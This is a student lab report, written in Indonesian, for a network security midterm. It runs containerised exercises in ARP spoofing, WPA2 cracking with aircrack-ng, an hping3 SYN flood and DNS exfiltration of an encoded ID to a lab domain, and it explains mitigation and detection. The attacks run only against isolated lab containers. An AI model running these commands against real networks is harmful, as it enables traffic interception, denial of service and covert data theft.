# Laporan UTS Keamanan Jaringan — Kasus 3 (k3)

**Nama**: (isi nama Anda)
**NIM**: 24552011148
**Kasus**: 3 (k3)

## Parameter Kasus
| Parameter | Nilai |
|---|---|
| Container target | target-k3 |
| Volume | vol-k3 |
| File laporan | laporan-k3.txt |
| Kata sandi | kunci-k3-2026 |
| Domain | k3.exfil.lab |

Semua perintah dijalankan di PowerShell (Windows), di dalam folder repositori `uts-network-lab`.

---

## Tugas 1 (Pertemuan 1): Docker dan Volume

### Perintah
```powershell
docker volume create vol-k3
docker run --name w-k3 -v vol-k3:/data alpine sh -c 'echo 24552011148 > /data/laporan-k3.txt'
docker rm w-k3
docker run --rm -v vol-k3:/data alpine cat /data/laporan-k3.txt
docker compose -p k3 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k3 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k3 -f b/b1-compose/docker-compose.yml down -v
```

### Bukti
![Isi file dari container baru](screenshots/t1-file.png)
![Halaman nginx dari attacker](screenshots/t1-nginx.png)

### Penjelasan
Docker volume (`vol-k3`) digunakan agar data (`laporan-k3.txt`) tetap ada walaupun container yang membuatnya (`w-k3`) sudah dihapus. Ini membuktikan volume bersifat *persistent* dan terlepas dari siklus hidup container. Bagian kedua membuktikan container `attacker` dapat mengakses layanan web di container `target` melalui jaringan internal Docker Compose.

---

## Tugas 2 (Pertemuan 2): Kriptografi

### Perintah
```powershell
docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'echo isi laporan k3 > laporan-k3.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k3.txt -out laporan-k3.enc -pass pass:kunci-k3-2026 && sha256sum laporan-k3.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k3.enc -out hasil-k3.txt -pass pass:kunci-k3-2026 && sha256sum hasil-k3.txt'
docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k3.pem -out cert-k3.pem -days 30 -subj /CN=k3.uts.local && openssl x509 -in cert-k3.pem -noout -subject -issuer -dates'
```

### Bukti
![Dua hash SHA-256 identik](screenshots/t2-hash.png)
![Subject dan Issuer sertifikat](screenshots/t2-cert.png)

### Penjelasan
File `laporan-k3.txt` dienkripsi dengan AES-256-CBC memakai kata sandi `kunci-k3-2026`, lalu didekripsi kembali menjadi `hasil-k3.txt`. Hash SHA-256 dari file asli dan file hasil dekripsi identik, membuktikan proses enkripsi-dekripsi tidak mengubah isi data (integritas terjaga). Bagian kedua membuat sertifikat X.509 self-signed; karena self-signed, Subject dan Issuer bernilai sama (`CN=k3.uts.local`).

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

### Perintah
```powershell
docker network create lab-arp-k3
docker run -d --name korban-k3 --network lab-arp-k3 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k3 --network lab-arp-k3 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k3 --network lab-arp-k3 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k3.IPAddress}}' korban-k3 gateway-k3

docker exec korban-k3 arp -a
docker exec -d penyerang-k3 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
docker exec korban-k3 arp -a
docker exec korban-k3 arp -s <ip-gateway> $(docker exec gateway-k3 cat /sys/class/net/eth0/address)
docker exec korban-k3 arp -a
```

### Bukti
![ARP table sebelum spoofing](screenshots/t3-arp-before.png)
![ARP table saat spoofing (MAC gateway berubah)](screenshots/t3-arp-spoofed.png)
![ARP table setelah mitigasi static ARP](screenshots/t3-arp-fixed.png)

### Penjelasan
Sebelum spoofing, tabel ARP korban memetakan IP gateway ke MAC address gateway yang asli. Setelah `penyerang-k3` menjalankan `arpspoof`, entri ARP korban untuk IP gateway berubah menjadi MAC address milik penyerang — ini adalah inti serangan ARP spoofing/poisoning: korban tertipu mengirim trafik yang ditujukan ke gateway justru ke penyerang. Mitigasi dilakukan dengan menambahkan entri ARP statis (`arp -s`) yang mengunci pemetaan IP-gateway ke MAC gateway asli secara permanen, sehingga paket ARP palsu dari penyerang tidak lagi diterima.

---

## Tugas 4 (Pertemuan 4): Analisis Handshake WPA2

### Perintah
```powershell
docker run --rm -v "${PWD}:/work" uts-kali-tools aircrack-ng -w wordlist-k3.txt handshake-k3.cap
```

### Bukti
![Hasil aircrack-ng](screenshots/t4-aircrack.png)

### Penjelasan
`aircrack-ng` mencocokkan setiap kata dalam `wordlist-k3.txt` terhadap data handshake WPA2 yang terekam di `handshake-k3.cap`, untuk menemukan Pre-Shared Key (PSK) yang digunakan jaringan tersebut.

Empat langkah WPA2 4-way handshake:
1. **Message 1 (AP → Klien)**: Access Point mengirim ANonce (nilai acak) ke klien.
2. **Message 2 (Klien → AP)**: Klien membuat SNonce, menghitung PTK (Pairwise Transient Key) dari PSK + ANonce + SNonce + MAC address, lalu mengirim SNonce beserta MIC (Message Integrity Code) ke AP.
3. **Message 3 (AP → Klien)**: AP yang sudah menghitung PTK yang sama, mengirim GTK (Group Temporal Key) yang dienkripsi beserta MIC untuk verifikasi.
4. **Message 4 (Klien → AP)**: Klien mengonfirmasi penerimaan dengan mengirim ACK, dan kedua pihak mulai menggunakan PTK/GTK untuk enkripsi trafik data.

Karena seluruh proses ini melibatkan MIC yang bergantung pada PSK, menangkap handshake dan melakukan dictionary attack (seperti `aircrack-ng`) adalah cara menguji kekuatan PSK tersebut.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

### Perintah
```powershell
docker run --rm --network lab-arp-k3 -v "${PWD}/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```

### Bukti
![TTL dan tipe ICMP balasan](screenshots/t5-icmp.png)

### Penjelasan
Nilai TTL (Time To Live) pada paket balasan ICMP menunjukkan berapa banyak hop/router yang dilalui sejak nilai TTL awal dikurangi di tiap hop, sedangkan tipe ICMP (umumnya Echo Reply/tipe 0) menandakan host tujuan aktif dan merespons.

**Smurf attack**: serangan DoS yang memanfaatkan ICMP Echo Request ber-spoof dengan alamat sumber korban, dikirim ke alamat broadcast suatu jaringan. Semua host di jaringan itu akan membalas ke alamat korban secara bersamaan (amplifikasi), membanjiri korban dengan trafik ICMP sehingga menghabiskan bandwidth/resource korban — mirip prinsip pengujian ICMP di atas, tapi disalahgunakan dalam skala besar dengan spoofing dan broadcast.

---

## Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake

### Perintah
```powershell
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV"
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k3 -f b/b3-syn-flood/docker-compose.yml down -v
```

### Bukti
![Jumlah SYN_RECV sebelum serangan](screenshots/t6-syn-before.png)
![Jumlah SYN_RECV saat serangan](screenshots/t6-syn-flood.png)
![Paket SYN, SYN-ACK, ACK dari tcpdump](screenshots/t6-tcpdump.png)

### Penjelasan
Pada kondisi normal, koneksi TCP dibentuk melalui *three-way handshake*: klien mengirim **SYN**, server membalas **SYN-ACK**, klien membalas **ACK** — koneksi pun terbentuk. Saat `hping3 --flood` mengirim banyak paket SYN ber-spoof tanpa pernah menyelesaikan handshake (tidak ada ACK balik), server menyimpan banyak koneksi dalam status setengah-terbuka (SYN_RECV) di antrean backlog-nya. Terlihat dari lonjakan jumlah `SYN_RECV` sebelum vs saat serangan — inilah **SYN flood**, yang bisa menghabiskan resource/koneksi server sehingga klien sah tidak bisa terhubung.

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

### Perintah
```powershell
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml up -d
docker run --rm uts-kali-tools sh -c "echo -n 24552011148 | xxd -p"
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short <hex>.k3.exfil.lab @dns
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k3.log
docker run --rm -v "${PWD}:/work" uts-kali-tools python3 /work/kasus/k9-dns-detect/analisis_dns.py /work/dns-k3.log
docker run --rm uts-kali-tools sh -c "echo <hex> | xxd -r -p"
docker compose -p k3 -f b/b4-dns-exfil/docker-compose.yml down -v
```

### Bukti
![Label hex NIM terdeteksi di log DNS](screenshots/t7-log-detect.png)
![Hasil decode kembali menjadi NIM](screenshots/t7-decode.png)

### Penjelasan
**DNS exfiltration** adalah teknik membocorkan data secara diam-diam dengan menyisipkannya sebagai subdomain pada query DNS (di sini NIM diubah ke representasi hex, lalu dikirim sebagai label `<hex>.k3.exfil.lab`). Karena trafik DNS sering tidak diawasi ketat oleh firewall, teknik ini bisa dipakai untuk mencuri data melewati pengamanan jaringan biasa. Skrip `analisis_dns.py` membaca log server DNS dan mendeteksi pola subdomain yang berisi data hex yang tidak wajar (bukan nama domain normal) sebagai indikasi exfiltrasi — ini menunjukkan pentingnya monitoring/log DNS sebagai salah satu lapisan deteksi keamanan jaringan. Decode akhir (`xxd -r -p`) mengembalikan hex tersebut menjadi NIM asli (`24552011148`), membuktikan data berhasil "dibocorkan" dan direkonstruksi.

---

## Kesimpulan
(Tulis ringkasan pembelajaran Anda dari ketujuh tugas di atas: mulai dari manajemen container/volume, kriptografi dasar, serangan lapisan 2 (ARP spoofing), keamanan wireless (WPA2), serangan/analisis lapisan jaringan (ICMP, SYN flood), hingga eksfiltrasi data via DNS — serta pentingnya mitigasi pada tiap kasus.)
